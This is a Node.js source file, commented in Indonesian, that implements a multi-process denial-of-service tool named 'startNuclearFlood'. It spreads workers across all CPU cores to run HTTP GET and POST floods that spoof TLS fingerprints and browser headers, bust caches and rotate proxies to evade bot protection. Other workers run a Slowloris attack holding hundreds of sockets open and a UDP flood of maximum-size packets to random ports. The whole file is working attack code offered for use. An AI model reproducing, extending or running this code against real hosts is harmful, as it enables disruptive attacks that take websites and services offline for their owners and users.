const cluster = require('cluster');
const os = require('os');
const TlsClient = require('tls-client-ng');
const { HeaderGenerator } = require('header-generator');
const { CookieJar } = require('tough-cookie');
const url = require('url');
const crypto = require('crypto');
const http = require('http');
const net = require('net');
const httpProxy = require('http-proxy');
const dgram = require('dgram'); // Untuk UDP Flood
const dns = require('dns');     // Untuk DNS resolution

// PASTE PROXY ANDA DI SINI (format: "http://user:pass@host:port")
const proxyList = [
    // "http://user1:pass1@proxy1.com:8080",
    // "http://user2:pass2@proxy2.com:8080",
];
const LOCAL_PROXY_PORT = 9999;

const headerGenerator = new HeaderGenerator({
    browsers: [
        { name: "chrome", minVersion: 120, httpVersion: "2" },
        { name: "firefox", minVersion: 120, httpVersion: "2" },
        { name: "edge", minVersion: 120, httpVersion: "2" },
        { name: "safari", minVersion: 17, httpVersion: "2" },
    ],
    devices: ["desktop"],
    operatingSystems: ["windows", "macos"],
    locales: ["en-US", "en-GB", "de-DE", "fr-FR"]
});

const clientProfiles = [
    'chrome_124',
    'chrome_120',
    'firefox_125',
    'firefox_120',
    'safari_17_2',
    'safari_16_5',
    'okteto_android_13',
    'mms_21_9',
];

function startSelfMadeProxy() {
    const proxy = httpProxy.createProxyServer({});

    const server = http.createServer((req, res) => {
        // This is a simple forward proxy for HTTP requests
        proxy.web(req, res, { target: req.url, changeOrigin: true }, (err) => {
            if (!res.headersSent) {
                res.writeHead(502);
            }
            res.end("Proxy error");
        });
    });

    // This handles HTTPS requests (CONNECT tunnel)
    server.on('connect', (req, clientSocket, head) => {
        const { port, hostname } = url.parse(`//${req.url}`, false, true);
        if (hostname && port) {
            const serverSocket = net.connect(port, hostname, () => {
                clientSocket.write(
                    'HTTP/1.1 200 Connection Established\r\n' +
                    'Proxy-agent: Node-Proxy\r\n' +
                    '\r\n'
                );
                serverSocket.write(head);
                serverSocket.pipe(clientSocket).on('error', () => {});
                clientSocket.pipe(serverSocket).on('error', () => {});
            });

            serverSocket.on('error', (err) => {
                clientSocket.end(`HTTP/1.1 500 ${err.message}\r\n\r\n`);
            });
        } else {
            clientSocket.end('HTTP/1.1 400 Bad Request\r\n\r\n');
        }
    });

    server.listen(LOCAL_PROXY_PORT, () => {
        console.log(`Proxy buatan sendiri berjalan di http://127.0.0.1:${LOCAL_PROXY_PORT}`);
    }).on('error', (err) => console.error("Gagal memulai server proxy:", err.message));

    return `http://127.0.0.1:${LOCAL_PROXY_PORT}`;
}

function getBypassOptions(target, cookieJar) {
    const headers = headerGenerator.getHeaders();

    // Membuat referer lebih realistis dengan terkadang menunjuk ke situs itu sendiri
    if (Math.random() > 0.3) {
        // header-generator sudah menyediakan referer eksternal yang baik
    } else {
        headers['referer'] = `${target.protocol}//${target.host}/`;
    }

    const options = {
        headers: headers,
        cookieJar: cookieJar,
        insecureSkipVerify: true,
        timeout: 15000,
        clientIdentifier: clientProfiles[Math.floor(Math.random() * clientProfiles.length)],
    };

    if (proxyList.length > 0) {
        options.proxy = proxyList[Math.floor(Math.random() * proxyList.length)];
    }

    return options;
}

function generateComplexJsonPayload() {
    const data = {
        id: crypto.randomUUID(),
        timestamp: Date.now(),
        user: {
            userId: crypto.randomBytes(16).toString('hex'),
            session: crypto.randomBytes(32).toString('hex'),
            attributes: {}
        },
        data: [],
        metadata: {
            source: "synthetic-load-generator",
            traceId: crypto.randomUUID()
        }
    };
    for (let i = 0; i < 25; i++) {
        data.user.attributes[`attr_${i}`] = crypto.randomBytes(20).toString('hex');
        data.data.push({ key: crypto.randomBytes(10).toString('hex'), value: crypto.randomBytes(100).toString('hex') });
    }
    return JSON.stringify(data);
}

const payloadPool = [];
for (let i = 0; i < 50; i++) {
    payloadPool.push(generateComplexJsonPayload());
}
const getRandomPayload = () => payloadPool[Math.floor(Math.random() * payloadPool.length)];

function executeUdpFlood(targetIp, durationSeconds) {
    const attackName = "UDP Flood";
    console.log(`Worker ${process.pid} memulai serangan ${attackName} ke ${targetIp} selama ${durationSeconds} detik.`);

    const client = dgram.createSocket('udp4');
    // Buat payload acak sekali untuk efisiensi
    const payload = crypto.randomBytes(65500);

    let localSent = 0;
    let isAttackActive = true;

    const attack = () => {
        if (!isAttackActive) {
            try { client.close(); } catch (e) {}
            return;
        }
        
        // Kirim ke port acak
        client.send(payload, Math.floor(Math.random() * 65535) + 1, targetIp, (err) => {
            if (!err) {
                localSent++;
            }
        });
        
        // Loop secepat mungkin
        setImmediate(attack);
    };

    // Kirim statistik secara berkala
    const statsInterval = setInterval(() => {
        if (process.send) {
            process.send({
                type: 'stats',
                sent: localSent,
                error: 0 // UDP bersifat connectionless, pelacakan error tidak langsung
            });
        }
        localSent = 0;
    }, 5000); // Lapor setiap 5 detik

    attack();

    setTimeout(() => {
        isAttackActive = false;
        clearInterval(statsInterval);

        // Kirim sisa statistik sebelum keluar
        if (process.send && localSent > 0) {
            process.send({ type: 'stats', sent: localSent, error: 0 });
        }

        console.log(`Worker ${process.pid} telah menghentikan serangan ${attackName} ke ${targetIp}.`);
        process.exit(0);
    }, durationSeconds * 1000);
}

function executeSlowlorisAttack(targetHost, targetPort, durationSeconds) {
    const attackName = "Slowloris";
    const socketCount = 400;
    const keepAliveInterval = 10000; // 10 detik
    console.log(`Worker ${process.pid} memulai serangan ${attackName} ke ${targetHost}:${targetPort} dengan ${socketCount} sockets.`);

    let sockets = [];
    let localSent = 0; // Menghitung koneksi awal yang berhasil
    let localError = 0;
    let isAttackActive = true;

    const headers = [
        `GET /?${crypto.randomBytes(8).toString('hex')} HTTP/1.1`,
        `Host: ${targetHost}`,
        `User-Agent: ${headerGenerator.getHeaders()['user-agent']}`,
        `Accept-language: en-US,en,q=0.5`,
        `Accept-encoding: gzip, deflate`,
    ].join('\r\n') + '\r\n';

    const createSocket = () => {
        const socket = new net.Socket();

        socket.on('connect', () => {
            socket.write(headers);
            localSent++;

            // Jaga koneksi tetap hidup dengan mengirim header tambahan
            socket.keepAliveInterval = setInterval(() => {
                if (socket.writable) {
                    socket.write(`X-a: ${crypto.randomBytes(4).toString('hex')}\r\n`);
                }
            }, keepAliveInterval);
        });

        const replaceSocket = () => {
            clearInterval(socket.keepAliveInterval);
            socket.destroy();
            // Jika serangan masih aktif, ganti socket yang mati
            if (isAttackActive) {
                sockets = sockets.filter(s => s !== socket);
                sockets.push(createSocket());
            }
        };

        socket.on('error', () => { localError++; replaceSocket(); });
        socket.on('close', replaceSocket);
        
        socket.connect(targetPort, targetHost);
        return socket;
    };

    for (let i = 0; i < socketCount; i++) {
        sockets.push(createSocket());
    }

    const statsInterval = setInterval(() => {
        if (process.send) {
            process.send({ type: 'stats', sent: localSent, error: localError });
        }
        localSent = 0; localError = 0;
    }, 5000);

    setTimeout(() => {
        isAttackActive = false;
        clearInterval(statsInterval);
        sockets.forEach(s => { clearInterval(s.keepAliveInterval); s.destroy(); });

        console.log(`Worker ${process.pid} telah menghentikan serangan ${attackName} ke ${targetHost}.`);
        process.exit(0);
    }, durationSeconds * 1000);
}

function runWorkerAttack(targetUrl, durationSeconds, attackType) {
    const isPostAttack = attackType === 'post';
    
    // Konfigurasi yang disesuaikan per jenis serangan
    const streamsPerLoop = isPostAttack ? 400 : 500;
    // Lapor setiap ~50,000 request untuk monitoring lebih akurat dan lancar
    const reportAfterLoops = isPostAttack ? 125 : 100; 
    const attackName = isPostAttack ? "Bypasser POST" : "Bypasser GET";

    let localSent = 0;
    let localError = 0;
    let loopCount = 0;

    const target = url.parse(targetUrl);
    const client = new TlsClient();
    const cookieJar = new CookieJar();

    console.log(`Worker ${process.pid} memulai serangan ${attackName} ke ${target.host} selama ${durationSeconds} detik.`);

    let isAttackActive = true;
 
    const attack = () => {
        const cacheBustingUrl = `${targetUrl}${targetUrl.includes('?') ? '&' : '?'}_=${crypto.randomBytes(8).toString('hex')}`;
        const options = getBypassOptions(target, cookieJar);
        
        localSent++;

        if (isPostAttack) {
            const payload = getRandomPayload();
            options.body = payload;
            options.headers['content-type'] = 'application/json';
            client.post(cacheBustingUrl, options).catch(() => {
                localError++;
            });
        } else {
            client.get(cacheBustingUrl, options).catch(() => {
                localError++;
            });
        }
    };
 
    const attackLoop = () => {
        if (!isAttackActive) return;

        for (let i = 0; i < streamsPerLoop; i++) {
            attack();
        }

        loopCount++;
        if (loopCount >= reportAfterLoops) {
            if (process.send) {
                process.send({
                    type: 'stats',
                    sent: localSent,
                    error: localError
                });
            }
            localSent = 0;
            localError = 0;
            loopCount = 0;
        }

        setImmediate(attackLoop);
    };

    attackLoop();

    setTimeout(() => {
        isAttackActive = false;

        // Kirim sisa statistik sebelum keluar
        if (process.send && (localSent > 0 || localError > 0)) {
            process.send({
                type: 'stats',
                sent: localSent,
                error: localError
            });
        }

        console.log(`Worker ${process.pid} telah menghentikan serangan ${attackName} ke ${target.host}.`);
        process.exit(0);
    }, durationSeconds * 1000);
}

function startNuclearFlood(targetUrl, durationSeconds, statusCallback) { // This function runs in the master process
    if (cluster.isPrimary) { // Master process logic
        const selfMadeProxyUrl = startSelfMadeProxy();
        proxyList.push(selfMadeProxyUrl);

        console.log(`Master ${process.pid} menyiapkan cluster untuk serangan.`);
        
        cluster.settings = {
            exec: __filename,
            args: [targetUrl, String(durationSeconds)],
            execArgv: ['--max-old-space-size=1024']
        };

        let totalSent = 0;
        let totalError = 0;
        let secondsRemaining = durationSeconds;

        const monitorInterval = setInterval(() => {
            secondsRemaining -= 5;
            if (secondsRemaining < 0) secondsRemaining = 0;

            const successRate = totalSent > 0 ? ((totalSent - totalError) / totalSent * 100).toFixed(2) : "0.00";

            statusCallback({
                totalSent,
                totalError,
                successRate,
                secondsRemaining
            });

            if (secondsRemaining <= 0) {
                clearInterval(monitorInterval);
            }
        }, 5000);

        // Gunakan semua core CPU untuk performa maksimal
        const numCPUs = os.cpus().length;
        const attackMethods = ['get', 'post', 'slowloris', 'udp'];
        
        for (let i = 0; i < numCPUs; i++) {
            const workerAttackType = attackMethods[i % attackMethods.length];
            const worker = cluster.fork({ ATTACK_TYPE: workerAttackType });
            worker.on('message', (message) => {
                if (message.type === 'stats') {
                    totalSent += message.sent || 0;
                    totalError += message.error || 0;
                }
            });
        }

        cluster.on('exit', (worker) => {
            console.log(`Worker ${worker.process.pid} telah berhenti.`);
        });

        const stopAttack = () => {
            console.log("Master menerima perintah stop. Menghentikan semua worker.");
            clearInterval(monitorInterval);
            for (const id in cluster.workers) {
                if (cluster.workers[id]) {
                    cluster.workers[id].kill();
                }
            }
        };

        return { stop: stopAttack };
    }
}

if (cluster.isWorker) { // Worker process logic
    const [targetUrl, durationSeconds] = process.argv.slice(2);
    const workerAttackType = process.env.ATTACK_TYPE;
    const parsedUrl = url.parse(targetUrl);
    const duration = parseInt(durationSeconds, 10);

    switch (workerAttackType) {
        case 'get':
        case 'post':
            runWorkerAttack(targetUrl, duration, workerAttackType);
            break;
        case 'slowloris':
            const slowlorisPort = parsedUrl.protocol === 'https:' ? 443 : 80;
            executeSlowlorisAttack(parsedUrl.hostname, slowlorisPort, duration);
            break;
        case 'udp':
            dns.lookup(parsedUrl.hostname, (err, address) => {
                if (err) {
                    console.error(`Worker ${process.pid} gagal resolve DNS untuk UDP Flood: ${parsedUrl.hostname}`, err);
                    process.exit(1); // Keluar jika DNS lookup gagal
                }
                executeUdpFlood(address, duration);
            });
            break;
    }
}

module.exports = { startNuclearFlood };